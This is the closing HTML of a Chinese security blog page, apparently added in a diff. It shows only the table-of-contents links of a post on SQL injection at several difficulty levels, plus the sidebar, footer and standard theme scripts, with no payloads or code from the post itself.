class="nav-number">4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88%E6%9C%80%E7%9B%B4%E6%8E%A5%EF%BC%89"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：数字型注入（最直接）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E4%BD%BF%E7%94%A8SQLMap"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：使用SQLMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9APython%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="nav-number">4.5.4.</span> <span class="nav-text">方法4：Python脚本自动化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87LIMIT"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：注释绕过LIMIT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%AE%B9%E5%BF%8D%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：容忍速率限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%A4%9A%E4%B8%AASession%E7%BB%95%E8%BF%87%E9%99%90%E6%B5%81"><span class="nav-number">5.5.3.</span> <span class="nav-text">方法3：使用多个Session绕过限流</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%88%E4%B8%8D%E5%8F%97LIMIT%E5%BD%B1%E5%93%8D%EF%BC%89"><span class="nav-number">5.5.4.</span> <span class="nav-text">方法4：时间盲注（不受LIMIT影响）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">代码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8PDO%E9%A2%84%E7%BC%96%E8%AF%91%EF%BC%88%E6%9C%80%E4%BD%B3%E6%96%B9%E6%A1%88%EF%BC%89"><span class="nav-number">7.1.1.</span> <span class="nav-text">1. 使用PDO预编译（最佳方案）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E5%92%8C%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">7.1.2.</span> <span class="nav-text">2. 输入验证和白名单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99"><span class="nav-number">7.1.3.</span> <span class="nav-text">3. 最小权限原则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86"><span class="nav-number">7.1.4.</span> <span class="nav-text">4. 错误处理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%B1%82%E9%9D%A2"><span class="nav-number">7.2.</span> <span class="nav-text">检测层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-WAF%E8%A7%84%E5%88%99"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. WAF规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%9B%91%E6%8E%A7%E5%BC%82%E5%B8%B8%E6%9F%A5%E8%AF%A2"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 监控异常查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%99%90%E6%B5%81%E5%92%8C%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9A"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. 限流和账户锁定</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="nav-number">7.3.</span> <span class="nav-text">工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMap%E9%98%B2%E5%BE%A1%E6%B5%8B%E8%AF%95"><span class="nav-number">7.3.1.</span> <span class="nav-text">SQLMap防御测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7"><span class="nav-number">7.3.2.</span> <span class="nav-text">代码审计工具</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8Payload%E9%9B%86%E5%90%88"><span class="nav-number">9.</span> <span class="nav-text">常用Payload集合</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">9.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">9.2.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">9.3.</span> <span class="nav-text">绕过技巧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
